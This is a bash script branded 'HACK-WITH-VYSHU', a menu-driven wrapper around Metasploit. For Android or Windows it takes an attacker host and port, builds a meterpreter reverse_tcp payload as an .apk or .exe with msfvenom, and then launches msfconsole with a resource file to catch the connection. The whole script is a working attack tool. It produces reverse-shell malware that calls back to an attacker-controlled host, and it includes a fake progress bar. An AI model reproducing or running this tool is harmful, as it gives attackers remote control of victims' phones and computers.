#!/bin/bash
clear 
echo ""
echo ""
	echo -e " \e[5m \e[1m\e[40;38;5;82m----HACK-WITH-VYSHU-----\e[25m\e[0m " | pv -qL 10
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m 1:>>> Android  \n \e[34m2:>>> Windows \e[0m \n \e[0m\e[1;33m3:>>> Listener\n\e[0m\e[1;33m 4:>>> EXIT \e[0m \n MODE:->:' option
echo""
echo""
echo""

if [[ $option == *'1'* ]]; then
clear
	echo "PAYLOAD tool are getting ready " | pv -qL 8
	sleep 3
	clear 
	echo " "

	echo -e "\e[92mAndroid " | pv -qL 8 && echo -e "\e[92mPayload GEnarator is ready "

	echo " "
	printf " \e[1;31;42m LPort for payload  \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 10

	read port
	echo " "

	printf " \e[1;31;42m LHost for payload  \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 10

	read lhost
	echo " "

	printf " \e[1;31;42m LHost for Listener \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 10

	read lhost1
	echo " "

	printf " \e[1;31;42m Name for Payload   \e[0m \e[40;38;5;82m====> : \e[0m " | pv -qL 10

	read name
	echo " "

	printf " \e[101m\e[1;73m _-_-_-_ PLEASE-------WAIT _-_-_-_ \e[0m" 
	echo " "
	msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk && clear 
	clear 
	echo ""
	echo ""
	echo -e $'\033[96m Your payload has been generatered====> \e[1;33m '$name.apk' ' | pv -qL 11
	sleep 3
	echo ""
	echo ""

	echo -e $'\033[96m WAIT METASPLOIT RUNNING \e[0m\n'
	clear 
	echo -e $'\033[96mWait For The Listener To Start-----\e[25m\e[0m 	'
	sleep 2 && clear
	echo "==> 5%"
	sleep 1 && clear
	echo "===>10%"
	sleep 1 && clear
	echo "=====>15%"
	sleep 1 && clear
	echo "======>20%"
	sleep 1 && clear
	echo "========>25%"
	sleep 1 && clear
	echo "=========>30%>"
	sleep 1 && clear
	echo "============>35%"
	sleep 1 && clear
	echo "==============>40%"
	sleep 1 && clear
	echo "================>45%"
	sleep 1 && clear
	echo "===================>50%"
	sleep 1 && clear
	echo "=====================>55%"
	sleep 1 && clear
	echo "=======================>60%"
	sleep 1 && clear
	echo "=========================>65%"
	sleep 1 && clear
	echo "===========================>70%"
	sleep 1 && clear
	echo "==============================>75%"
	sleep 1 && clear
	echo "================================>80%"
	sleep 1 && clear
	echo "=================================>85%>"
	sleep 1 && clear
	echo "====================================>90%"
	sleep 1 && clear
	echo "======================================>95%"
	sleep 1 && clear
	echo "=======================================>100%"
	sleep 1 && clear
	clear 
	sed -e "s/\$lhost/$lhost1/" and-meterpreter.rc > $name.rc
	msfconsole -r $name.rc
	clear 
	./payload.sh 
#-------------------------------end---------of-----------------android-----------------------#
##############################################################################################
#-------------------------------start------of------------------windows-----------------------#
fi
	if [[ $option == *'2'* ]]; then
	clear
	echo "WINDOWS" | pv -qL 8
	sleep 3


	echo -e " \e[5m \e[1m\e[40;38;5;82m----HACK-WITH-VYSHU-----\e[25m\e[0m " | pv -qL 10
	echo " "

	echo -e "\e[92mWindows Payload GEnarator"

	echo " "
	printf " \e[1;31;42m LPort for payload  \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 10

	read port
	echo " "

	printf " \e[1;31;42m LHost for payload  \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 10

	read lhost
	echo " "

	printf " \e[1;31;42m LHost for Listener \e[0m \e[40;38;5;82m====> : \e[0m" | pv -qL 10

	read lhost1
	echo " "

	printf " \e[1;31;42m Name for Payload   \e[0m \e[40;38;5;82m====> : \e[0m " | pv -qL 10

	read name
	echo " "

	printf " \e[101m\e[1;73m _-_-_-_ PLEASE-------WAIT  _-_-_-_ \e[0m" 
	echo " "
	msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$port  -f exe -o  $name.exe && clear 
	clear 
	echo ""
	echo ""
	echo -e $'\033[96m Your Windows has been generatered====> \e[1;33m '$name.apk' ' | pv -qL 11
	sleep 3
	echo ""
	echo ""

	echo  -e $'\033[96mWAIT METASPLOIT CONSOLE  IS RUNNING ' | pv -qL 10
	sleep 3	
	clear 
	echo -e $'\033[96mWait For The Listener To Start'
	sleep 4
	sleep 2 && clear
	echo "==> 5%"
	sleep 1 && clear
	echo "===>10%"
	sleep 1 && clear
	echo "=====>15%"
	sleep 1 && clear
	echo "======>20%"
	sleep 1 && clear
	echo "========>25%"
	sleep 1 && clear
	echo "=========>30%>"
	sleep 1 && clear
	echo "============>35%"
	sleep 1 && clear
	echo "==============>40%"
	sleep 1 && clear
	echo "================>45%"
	sleep 1 && clear
	echo "===================>50%"
	sleep 1 && clear
	echo "=====================>55%"
	sleep 1 && clear
	echo "=======================>60%"
	sleep 1 && clear
	echo "=========================>65%"
	sleep 1 && clear
	echo "===========================>70%"
	sleep 1 && clear
	echo "==============================>75%"
	sleep 1 && clear
	echo "================================>80%"
	sleep 1 && clear
	echo "=================================>85%>"
	sleep 1 && clear
	echo "====================================>90%"
	sleep 1 && clear
	echo "======================================>95%"
	sleep 1 && clear
	echo "=======================================>100%"
	sleep 1 && clear
	clear 
	sed -e "s/\$lhost/$lhost1/" win-meterpreter.rc > $name.rc
	msfconsole -r $name.rc
	clear 
	./payload.sh 

#-------------------------------end-----------of------------------windows-----------------------#

fi


	if [[ $option == *'3'* ]]; then
	clear
	echo "Listener" |pv -qL 8
	./Listener.sh


fi


	if [[ $option == *'4'* ]]; then
	clear
	echo "EXIT-ing the tool Have a nice day " | pv -qL 8 && exit 
	exit
fi


sleep 3
./payload.sh 

